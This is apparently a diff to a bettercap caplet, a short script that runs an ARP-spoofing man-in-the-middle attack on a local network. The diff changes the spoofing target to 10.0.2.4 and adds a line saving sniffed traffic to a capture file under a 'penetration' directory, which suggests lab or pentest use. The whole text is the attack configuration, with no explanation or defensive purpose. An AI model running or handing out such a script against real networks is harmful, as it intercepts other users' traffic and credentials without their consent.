@@ -1,6 +1,7 @@
 net.probe on
 set arp.spoof.fullduplex true
-set arp.spoof.targets 192.168.1.15
+set arp.spoof.targets 10.0.2.4
 arp.spoof on
 set net.sniff.local true
+set net.sniff.output /root/penetration/capturefile.cap
 net.sniff on
